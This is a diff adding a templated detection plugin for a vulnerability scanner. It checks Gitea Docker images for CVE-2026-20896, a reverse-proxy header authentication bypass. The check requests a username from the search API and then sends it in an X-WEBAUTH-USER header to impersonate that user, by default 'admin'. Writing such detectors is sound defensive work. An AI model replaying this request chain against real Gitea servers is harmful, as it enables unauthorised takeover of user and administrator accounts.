@@ -1,0 +1,145 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Gitea_CVE_2026_20896"
+  author: "dyeddala"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2026-20896"
+  }
+  severity: CRITICAL
+  title: "Gitea Docker Image <= 1.26.2 - Reverse Proxy Header Authentication Bypass"
+  description: "The official Gitea Docker image through version 1.26.2 ships with REVERSE_PROXY_TRUSTED_PROXIES set to a wildcard, causing Gitea to trust reverse-proxy authentication headers (X-WEBAUTH-USER) from any source IP instead of restricting trust to the configured reverse proxy. When reverse-proxy authentication is enabled, an unauthenticated remote attacker can impersonate any existing user, including an administrator, by sending the target username in the X-WEBAUTH-USER header."
+  recommendation: "Upgrade the Gitea Docker image to version 1.26.3 or 1.26.4 or later, which restricts REVERSE_PROXY_TRUSTED_PROXIES to the intended internal proxy addresses."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2026-20896"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+
+actions: {
+  name: "fingerprint_gitea"
+  http_request: {
+    method: GET
+    uri: "/"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "<title>Gitea" }
+        ]
+      }
+    }
+  }
+}
+actions: {
+  name: "check_gitea_version"
+  http_request: {
+    method: GET
+    uri: "/api/v1/version"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          {
+            body: {}
+            contains: "version"
+          }
+        ]
+      }
+    }
+  }
+}
+actions: {
+  name: "search_target_user"
+  http_request: {
+    method: GET
+    uri: "/api/v1/users/search?limit=1"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          {
+            body: {}
+            contains: "\"ok\":true"
+          }
+        ]
+      }
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "\"login\":\"([^\"]+)\""
+            variable_name: "victim"
+          }
+        ]
+      }
+    }
+  }
+}
+actions: {
+  name: "verify_unauthenticated_status"
+  http_request: {
+    method: GET
+    uri: "/api/v1/user"
+    response: {
+      http_status: 401
+    }
+  }
+}
+actions: {
+  name: "check_auth_bypass"
+  http_request: {
+    method: GET
+    uri: "/api/v1/user"
+    headers: [
+      {
+        name: "X-WEBAUTH-USER"
+        value: "{{ victim }}"
+      }
+    ]
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          {
+            body: {}
+            contains: "\"login\":"
+          }
+        ]
+      }
+    }
+  }
+}
+#############
+# WORKFLOWS #
+#############
+workflows: {
+  variables: [
+    { name: "victim" value: "admin" }
+  ]
+  actions: [
+    "fingerprint_gitea",
+    "check_gitea_version",
+    "search_target_user",
+    "verify_unauthenticated_status",
+    "check_auth_bypass"
+  ]
+}
